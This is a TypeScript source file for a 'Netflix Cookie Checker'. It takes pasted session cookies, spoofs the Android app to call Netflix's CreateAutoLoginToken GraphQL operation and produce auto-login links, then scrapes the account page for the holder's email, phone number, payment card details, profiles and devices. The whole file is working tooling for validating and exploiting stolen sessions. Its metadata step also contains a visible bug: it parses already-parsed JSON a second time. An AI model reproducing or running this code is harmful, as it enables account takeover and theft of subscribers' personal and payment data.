// Netflix Cookie Checker - Port of Python NetflixTokenChecker to TypeScript

// ─── Types ───────────────────────────────────────────────────────────────────

export interface NFTokenResult {
  success: boolean;
  token?: string;
  link?: string;
  error?: string;
}

export interface NetflixMetadata {
  country?: string;
  countryName?: string;
  plan?: string;
  price?: string;
  currency?: string;
  videoQuality?: string;
  maxStreams?: number;
  status?: string;
  memberSince?: string;
  nextBilling?: string;
  email?: string;
  phone?: string;
  paymentMethod?: string;
  profiles?: string;
  devices?: string;
}

export interface CheckResult {
  success: boolean;
  token?: string;
  link?: string;
  metadata?: NetflixMetadata;
  error?: string;
}

// ─── Constants ───────────────────────────────────────────────────────────────

const NETFLIX_GRAPHQL_URL = "https://android13.prod.ftl.netflix.com/graphql";
const NETFLIX_MEMBERSHIP_URL = "https://www.netflix.com/account/membership";
const NF_TOKEN_BASE = "https://www.netflix.com/browse";
const FETCH_TIMEOUT = 30000;

const DROID_USER_AGENT =
  "com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)";

const COUNTRY_NAMES: Record<string, string> = {
  US: "Estados Unidos",
  GB: "Reino Unido",
  CA: "Canadá",
  AU: "Australia",
  FR: "Francia",
  DE: "Alemania",
  JP: "Japón",
  BR: "Brasil",
  MX: "México",
  AR: "Argentina",
  CO: "Colombia",
  CL: "Chile",
  ES: "España",
  IT: "Italia",
  KR: "Corea del Sur",
  IN: "India",
  TR: "Turquía",
  SE: "Suecia",
  NL: "Países Bajos",
  PL: "Polonia",
  TH: "Tailandia",
  PH: "Filipinas",
  ID: "Indonesia",
  MY: "Malasia",
  SG: "Singapur",
  NZ: "Nueva Zelanda",
  IE: "Irlanda",
  PT: "Portugal",
  BE: "Bélgica",
  AT: "Austria",
  CH: "Suiza",
  DK: "Dinamarca",
  FI: "Finlandia",
  NO: "Noruega",
  ZA: "Sudáfrica",
  NG: "Nigeria",
  EG: "Egipto",
  SA: "Arabia Saudita",
  AE: "Emiratos Árabes",
  IL: "Israel",
};

// ─── JSON Utilities ──────────────────────────────────────────────────────────

/** Convert \xHH escape sequences to real characters */
function cleanJsonStr(s: string): string {
  return s.replace(/\\x([0-9a-fA-F]{2})/g, (_, hex) =>
    String.fromCharCode(parseInt(hex, 16))
  );
}

/** Extract balanced JSON starting from position */
function extractBalancedForward(text: string, start: number): string | null {
  let depth = 0;
  let i = start;
  while (i < text.length) {
    const ch = text[i];
    if (ch === "{") depth++;
    else if (ch === "}") {
      depth--;
      if (depth === 0) {
        return text.substring(start, i + 1);
      }
    } else if (ch === '"') {
      // skip string
      i++;
      while (i < text.length) {
        if (text[i] === "\\") {
          i += 2;
          continue;
        }
        if (text[i] === '"') break;
        i++;
      }
    }
    i++;
  }
  return null;
}

/** Extract root JSON object from Netflix HTML response */
function extractRootJson(html: string): any | null {
  // Try to find netflix.reactContext pattern
  const reactCtxMatch = html.indexOf("netflix.reactContext = ");
  if (reactCtxMatch !== -1) {
    const start = html.indexOf("{", reactCtxMatch);
    if (start !== -1) {
      const raw = extractBalancedForward(html, start);
      if (raw) {
        try {
          return JSON.parse(cleanJsonStr(raw));
        } catch {
          // fallback
        }
      }
    }
  }

  // Try to find {"title":"Netflix" pattern
  const titleMatch = html.indexOf('{"title":"Netflix"');
  if (titleMatch !== -1) {
    const raw = extractBalancedForward(html, titleMatch);
    if (raw) {
      try {
        return JSON.parse(cleanJsonStr(raw));
      } catch {
        // fallback
      }
    }
  }

  // Try finding any top-level JSON object
  for (const marker of ['"title":"Netflix"', '"userInfo"', '"membership"']) {
    const idx = html.indexOf(marker);
    if (idx !== -1) {
      // Walk backwards to find the opening {
      let start = idx;
      while (start > 0 && html[start] !== "{") start--;
      const raw = extractBalancedForward(html, start);
      if (raw) {
        try {
          return JSON.parse(cleanJsonStr(raw));
        } catch {
          continue;
        }
      }
    }
  }

  return null;
}

/** Get nested dict value from object */
function getv(d: any, key: string): any {
  if (!d || typeof d !== "object") return undefined;
  return d[key];
}

/** Deep navigation in nested dict */
function dig(data: any, ...keys: string[]): any {
  let current = data;
  for (const key of keys) {
    if (current === null || current === undefined) return undefined;
    current = getv(current, key);
  }
  return current;
}

// ─── Cookie Parsing ──────────────────────────────────────────────────────────

/** Parse Netscape format cookie file content */
function parseNetscapeCookies(content: string): Record<string, string> {
  const cookies: Record<string, string> = {};
  const lines = content.split("\n");

  for (const rawLine of lines) {
    const line = rawLine.trim();
    // Skip comments and empty lines
    if (!line || line.startsWith("#")) continue;

    const parts = line.split("\t");
    if (parts.length >= 7) {
      // Netscape format: domain flag path secure expiration name value
      const name = parts[5].trim();
      const value = parts[6].trim();
      if (name) {
        cookies[name] = value;
      }
    }
  }

  return cookies;
}

/** Extract cookies from JSON (Cookie Editor), Netscape, or raw string formats */
export function extractCookiesFromText(text: string): Record<string, string> | null {
  if (!text || !text.trim()) return null;

  const trimmed = text.trim();

  // Try JSON format (Cookie Editor export)
  if (trimmed.startsWith("[") || trimmed.startsWith("{")) {
    try {
      const parsed = JSON.parse(trimmed);
      const arr = Array.isArray(parsed) ? parsed : [parsed];
      const cookies: Record<string, string> = {};

      for (const item of arr) {
        if (item && item.name && item.value !== undefined) {
          cookies[item.name] = item.value;
        }
      }

      if (Object.keys(cookies).length > 0) return cookies;
    } catch {
      // Not valid JSON, try other formats
    }
  }

  // Try Netscape format (tab-separated)
  if (trimmed.includes("\t")) {
    const cookies = parseNetscapeCookies(trimmed);
    if (Object.keys(cookies).length > 0) return cookies;
  }

  // Try raw cookie string format: "name=value; name2=value2; ..."
  if (trimmed.includes("=")) {
    const cookies: Record<string, string> = {};
    const pairs = trimmed.split(";");

    for (const pair of pairs) {
      const eqIdx = pair.indexOf("=");
      if (eqIdx > 0) {
        const name = pair.substring(0, eqIdx).trim();
        const value = pair.substring(eqIdx + 1).trim();
        if (name) {
          cookies[name] = value;
        }
      }
    }

    if (Object.keys(cookies).length > 0) return cookies;
  }

  return null;
}

/** Build cookie header string from cookie dictionary */
export function buildCookieString(
  cookieDict: Record<string, string>,
  onlyAndroid: boolean = false
): string {
  // Core Android cookies that Netflix needs
  const androidKeys = new Set([
    "NetflixId",
    "SecureNetflixId",
    "nfvdid",
    "clid",
    "bid",
    "pmtest",
    "uuid",
    "mtToken",
    "prid",
  ]);

  const pairs: string[] = [];

  for (const [key, value] of Object.entries(cookieDict)) {
    if (!value) continue;
    if (onlyAndroid && !androidKeys.has(key)) continue;
    pairs.push(`${key}=${value}`);
  }

  return pairs.join("; ");
}

// ─── NFToken Generation ─────────────────────────────────────────────────────

/** Call Netflix GraphQL API to generate NFToken */
export async function checkCookie(
  cookieDict: Record<string, string>
): Promise<NFTokenResult> {
  const netflixId = cookieDict["NetflixId"];
  const secureNetflixId = cookieDict["SecureNetflixId"];
  const nfvdid = cookieDict["nfvdid"];

  if (!netflixId && !secureNetflixId) {
    return {
      success: false,
      error: "No se encontraron cookies válidas (NetflixId o SecureNetflixId)",
    };
  }

  const cookieString = buildCookieString(cookieDict, true);

  const graphqlBody = JSON.stringify({
    operationName: "CreateAutoLoginToken",
    variables: {
      scope: "WEBVIEW_MOBILE_STREAMING",
    },
    extensions: {
      persistedQuery: {
        version: 102,
        id: "76e97129-f4b5-41a0-a73c-12e674896849",
      },
    },
  });

  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), FETCH_TIMEOUT);

    const response = await fetch(NETFLIX_GRAPHQL_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "User-Agent": DROID_USER_AGENT,
        Cookie: cookieString,
        Accept:
          "multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json",
        Origin: "https://www.netflix.com",
        Referer: "https://www.netflix.com/",
      },
      body: graphqlBody,
      signal: controller.signal,
    });

    clearTimeout(timeoutId);

    if (!response.ok) {
      return {
        success: false,
        error: `Netflix API respondió con estado ${response.status}`,
      };
    }

    const data = await response.json();

    // Navigate the response to find the token
    // Format 1: data.data.createAutoLoginToken (string token directly)
    const tokenDirect = dig(
      data,
      "data",
      "createAutoLoginToken"
    );
    // Format 2: data.data.createAutoLoginToken.autoLoginToken.token
    const tokenNested = dig(
      data,
      "data",
      "createAutoLoginToken",
      "autoLoginToken",
      "token"
    );
    const token = typeof tokenDirect === "string" ? tokenDirect : tokenNested;

    if (token) {
      const link = `${NF_TOKEN_BASE}?autoLoginToken=${token}`;
      return {
        success: true,
        token,
        link,
      };
    }

    // Check for errors
    const errors = data.errors;
    if (errors && Array.isArray(errors) && errors.length > 0) {
      const errMessage = typeof errors[0] === "string"
        ? errors[0]
        : errors[0]?.message || JSON.stringify(errors[0]);
      return {
        success: false,
        error: `API de Netflix: ${errMessage}`,
      };
    }

    return {
      success: false,
      error: "No se pudo generar el NFToken (cookie inválida o expirada)",
    };
  } catch (err: any) {
    if (err.name === "AbortError") {
      return { success: false, error: "Timeout: Netflix no respondió a tiempo" };
    }
    return {
      success: false,
      error: `Error de conexión: ${err.message || "Desconocido"}`,
    };
  }
}

// ─── Metadata Extraction ─────────────────────────────────────────────────────

/** _getv: Netflix wraps values in { value: actualValue }, this unwraps them */
function _getv(d: any, key: string): any {
  if (!d || typeof d !== "object") return undefined;
  const v = d[key];
  if (v === undefined || v === null) return undefined;
  if (typeof v === "object" && !Array.isArray(v) && "value" in v) return v.value;
  return v;
}

/** Convert timestamp ms to readable date */
function tsToDate(ts: any): string | undefined {
  if (!ts || typeof ts !== "number") return undefined;
  try {
    const d = new Date(ts);
    return isNaN(d.getTime()) ? undefined : d.toISOString().split("T")[0];
  } catch {
    return undefined;
  }
}

/** Port of Python parse_metadata_from_json — uses Netflix's actual JSON structure */
function parseMetadataFromJson(rcData: any): NetflixMetadata {
  const m: NetflixMetadata = {};

  const models = rcData?.models || {};

  // ── signupContext ──
  const sc = dig(models, "signupContext", "data") || {};
  const fields = dig(sc, "flow", "fields") || {};
  const plan = dig(fields, "currentPlan", "fields") || {};

  m.plan          = _getv(plan, "localizedPlanName") || undefined;
  m.price         = _getv(plan, "planPrice") || undefined;
  m.videoQuality  = _getv(plan, "videoQuality") || undefined;
  m.maxStreams     = _getv(plan, "maxStreams") ?? undefined;

  const nextBilling = _getv(fields, "nextBillingDate");
  if (nextBilling) m.nextBilling = typeof nextBilling === "number" ? tsToDate(nextBilling) : String(nextBilling);

  const memberSince = _getv(fields, "memberSince");
  if (memberSince) m.memberSince = typeof memberSince === "number" ? tsToDate(memberSince) : String(memberSince);

  // Country from geo
  const geoRc = dig(sc, "geo", "requestCountry") || {};
  if (geoRc.countryName) m.countryName = geoRc.countryName;
  if (geoRc.id) {
    m.country = geoRc.id;
    if (!m.countryName) m.countryName = COUNTRY_NAMES[geoRc.id] || geoRc.id;
  }

  // userInfo from signupContext
  const user = sc.userInfo || {};
  if (user.membershipStatus) m.status = user.membershipStatus;
  if (user.countryOfSignup) {
    if (!m.country) m.country = user.countryOfSignup;
    if (!m.countryName) m.countryName = COUNTRY_NAMES[user.countryOfSignup] || user.countryOfSignup;
  }
  if (!m.memberSince && user.memberSince) {
    m.memberSince = typeof user.memberSince === "number" ? tsToDate(user.memberSince) : String(user.memberSince);
  }

  // ── Fallbacks from other model paths ──
  if (!m.status) m.status = dig(models, "userInfo", "data", "membershipStatus");
  if (!m.country) {
    const m2 = dig(models, "geo", "data", "requestCountry") || {};
    if (m2.id) {
      m.country = m2.id;
      if (!m.countryName) m.countryName = COUNTRY_NAMES[m2.id] || m2.id;
    }
  }

  // ── accountInfo ──
  const ai = dig(models, "accountInfo", "data") || {};
  if (!m.email && ai.emailAddress) m.email = ai.emailAddress;
  if (!m.phone && ai.phoneNumber) m.phone = ai.phoneNumber;
  if (m.maxStreams === undefined && ai.maxStreams !== undefined) m.maxStreams = Number(ai.maxStreams);

  // ── contentRestrictions ──
  const cr = dig(models, "contentRestrictions", "data", "profileInfo") || {};
  if (cr.profileName) {
    if (!m.profiles) m.profiles = cr.profileName;
  }

  // ── Payment method ──
  const pm = _getv(fields, "paymentMethods");
  if (pm && Array.isArray(pm) && pm.length > 0) {
    const fv = dig(pm[0], "value") || {};
    const ct = _getv(fv, "type");
    const cn = _getv(fv, "displayText");
    if (ct && cn) m.paymentMethod = `${ct} ****${cn}`;
  }

  // ── GraphQL ROOT_QUERY ──
  const rq = dig(rcData, "graphql", "data", "ROOT_QUERY") || {};
  for (const k of Object.keys(rq)) {
    if (!k.includes("growthAccount")) continue;
    const v = rq[k];
    if (!v || typeof v !== "object") continue;

    // Plan
    if (!m.plan) {
      const gp = dig(v, "currentPlan", "plan", "name");
      if (gp) m.plan = gp;
    }
    // Status
    if (!m.status && v.membershipStatus) m.status = v.membershipStatus;
    // Member since
    if (!m.memberSince && v.memberSince) {
      m.memberSince = typeof v.memberSince === "number" ? tsToDate(v.memberSince) : String(v.memberSince);
    }
    // Next billing
    if (!m.nextBilling && v.nextBillingDate) {
      const nbd = v.nextBillingDate;
      if (typeof nbd === "object" && nbd.localDate) m.nextBilling = nbd.localDate;
      else if (typeof nbd === "string") m.nextBilling = nbd;
    }
    // Country of sign up
    if (!m.country) {
      const cos = dig(v, "countryOfSignUp");
      if (cos) {
        m.country = typeof cos === "object" ? cos.code || cos : cos;
        if (!m.countryName) m.countryName = COUNTRY_NAMES[m.country] || m.country;
      }
    }
    // Phone
    if (!m.phone) {
      const ph = dig(v, "growthLocalizablePhoneNumber", "rawPhoneNumber", "phoneNumberDigits", "value");
      if (ph) m.phone = ph;
    }
    // Profiles
    const profs = v.profiles;
    if (profs && Array.isArray(profs) && !m.profiles) {
      m.profiles = profs.map((p: any) => p.name || "Sin nombre").join(", ");
    }
    // Max streams
    if (m.maxStreams === undefined) {
      const ms2 = dig(v, "currentPlan", "plan", "streams");
      if (ms2 !== undefined) m.maxStreams = Number(ms2);
    }
    // Video quality
    if (!m.videoQuality) {
      const vq = dig(v, "currentPlan", "plan", "videoQuality");
      if (vq) m.videoQuality = vq;
    }
    break; // Only process first growthAccount entry
  }

  // ── Devices ──
  const dm = dig(models, "deviceManagementModel", "data") || {};
  const devs = dm.devices;
  if (devs && Array.isArray(devs) && devs.length > 0) {
    m.devices = `${devs.length} dispositivo(s) activo(s)`;
  }

  return m;
}

/** Fetch Netflix membership page and extract metadata */
export async function getMetadata(
  cookieDict: Record<string, string>
): Promise<NetflixMetadata> {
  const cookieString = buildCookieString(cookieDict, false);

  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), FETCH_TIMEOUT);

    const response = await fetch(NETFLIX_MEMBERSHIP_URL, {
      method: "GET",
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        Cookie: cookieString,
        Accept:
          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
      },
      signal: controller.signal,
      redirect: "follow",
    });

    clearTimeout(timeoutId);

    if (!response.ok) {
      return {};
    }

    const html = await response.text();

    // Extract JSON from HTML using the bot's exact approach
    const jsonStr = extractRootJson(html);
    if (!jsonStr) return {};

    let rcData: any;
    try {
      rcData = JSON.parse(jsonStr);
    } catch {
      return {};
    }

    return parseMetadataFromJson(rcData);
  } catch (err: any) {
    console.error("Error fetching metadata:", err.message);
    return {};
  }
}

// ─── Full Check ──────────────────────────────────────────────────────────────

/** Full check: NFToken + metadata */
export async function fullCheck(
  cookieText: string
): Promise<CheckResult> {
  const cookieDict = extractCookiesFromText(cookieText);

  if (!cookieDict || Object.keys(cookieDict).length === 0) {
    return {
      success: false,
      error: "No se pudieron extraer cookies del texto proporcionado",
    };
  }

  // Check NFToken
  const tokenResult = await checkCookie(cookieDict);

  if (!tokenResult.success) {
    return {
      success: false,
      error: tokenResult.error,
    };
  }

  // Get metadata (don't fail if this fails)
  let metadata: NetflixMetadata = {};
  try {
    metadata = await getMetadata(cookieDict);
  } catch {
    // Non-critical, continue
  }

  return {
    success: true,
    token: tokenResult.token,
    link: tokenResult.link,
    metadata,
  };
}
